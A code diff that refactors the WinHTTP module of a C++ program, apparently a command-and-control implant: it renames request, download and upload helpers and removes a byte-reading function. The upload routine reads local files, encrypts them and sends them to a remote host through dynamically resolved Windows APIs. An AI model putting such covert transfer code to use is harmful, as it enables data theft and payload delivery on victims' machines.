@@ -2,7 +2,7 @@
 
 namespace System::Http
 {
-	WinHttpHandlers InitRequest(
+	WinHttpHandlers RequestInit(
 		Procs::PPROCS pProcs,
 		LPCWSTR lpHost,
 		INTERNET_PORT nPort
@@ -25,7 +25,7 @@ namespace System::Http
 		return {hSession, hConnect};
 	}
 
-	WinHttpResponse SendRequest(
+	WinHttpResponse RequestSend(
 		Procs::PPROCS pProcs,
 		HINTERNET hConnect,
 		LPCWSTR lpHost,
@@ -125,48 +125,8 @@ namespace System::Http
 		return {bResult, hRequest, dwStatusCode};
 	}
 
-	// Read response as bytes.
-	std::vector<BYTE> ReadResponseBytes(Procs::PPROCS pProcs, HINTERNET hRequest) {
-		std::vector<BYTE> bytes;
-
-		DWORD dwSize = 0;
-		DWORD dwDownloaded = 0;
-		do
-		{
-			dwSize = 0;
-			if (pProcs->lpWinHttpQueryDataAvailable(hRequest, &dwSize))
-			{
-				BYTE* tempBuffer = new BYTE[dwSize+1];
-				if (!tempBuffer)
-				{
-					dwSize = 0;
-				}
-				else
-				{
-					ZeroMemory(tempBuffer, dwSize+1);
-					if (pProcs->lpWinHttpReadData(
-						hRequest,
-						(LPVOID)tempBuffer,
-						dwSize,
-						&dwDownloaded
-					)) {
-						// Add to buffer;
-						for (size_t i = 0; i < dwDownloaded; ++i)
-						{
-							bytes.push_back(tempBuffer[i]);
-						}
-					}
-
-					delete [] tempBuffer;
-				}
-			}
-		} while (dwSize > 0);
-		
-		return bytes;
-	}
-
 	// Read response as text.
-	std::wstring ReadResponseText(Procs::PPROCS pProcs, HINTERNET hRequest) {
+	std::wstring ResponseRead(Procs::PPROCS pProcs, HINTERNET hRequest) {
 		std::wstring respText;
 
 		DWORD dwSize = 0;
@@ -191,7 +151,7 @@ namespace System::Http
 			}
 
 			// Read the data
-			pProcs->lpRtlZeroMemory(pszOutBuffer, dwSize+1);
+			RtlZeroMemory(pszOutBuffer, dwSize+1);
 			if (!pProcs->lpWinHttpReadData(
 				hRequest,
 				(LPVOID)pszOutBuffer,
@@ -216,7 +176,7 @@ namespace System::Http
 	}
 
 	// Wrapper for send&read&write response.
-	BOOL DownloadFile(
+	BOOL FileDownload(
 		Procs::PPROCS pProcs,
 		Crypt::PCRYPT pCrypt,
 		HINTERNET hConnect,
@@ -231,7 +191,7 @@ namespace System::Http
 		std::string sDest = Utils::Convert::UTF8Encode(wDest);
 
 		// Send request
-		WinHttpResponse resp = SendRequest(
+		WinHttpResponse resp = RequestSend(
 			pProcs,
 			hConnect,
 			lpHost,
@@ -248,7 +208,7 @@ namespace System::Http
 		}
 
 		// Read response data
-		std::wstring wEnc = ReadResponseText(pProcs, resp.hRequest);
+		std::wstring wEnc = ResponseRead(pProcs, resp.hRequest);
 		if (wEnc.length() == 0)
 		{
 			return FALSE;
@@ -262,7 +222,7 @@ namespace System::Http
 		);
 		
 		// Write data to file
-		if (!System::Fs::WriteBytesToFile(pProcs, wDest, bytes))
+		if (!System::Fs::FileWrite(pProcs, wDest, bytes))
 		{
 			return FALSE;
 		}
@@ -270,7 +230,7 @@ namespace System::Http
 		return TRUE;
 	}
 
-	BOOL UploadFile(
+	BOOL FileUpload(
         Procs::PPROCS pProcs,
 		Crypt::PCRYPT pCrypt,
         HINTERNET hConnect,
@@ -281,7 +241,7 @@ namespace System::Http
         const std::wstring& wSrc
     ) {
         // Read a local file.
-        std::vector<BYTE> bytes = System::Fs::ReadBytesFromFile(pProcs, wSrc);
+        std::vector<BYTE> bytes = System::Fs::FileRead(pProcs, wSrc);
         // Encrypt the data
         std::wstring wEnc = Crypt::Encrypt(
 			bytes,
@@ -290,7 +250,7 @@ namespace System::Http
 		);
 		std::string sEnc = Utils::Convert::UTF8Encode(wEnc);
 
-        System::Http::WinHttpResponse resp = System::Http::SendRequest(
+        System::Http::WinHttpResponse resp = System::Http::RequestSend(
             pProcs,
             hConnect,
             lpHost,
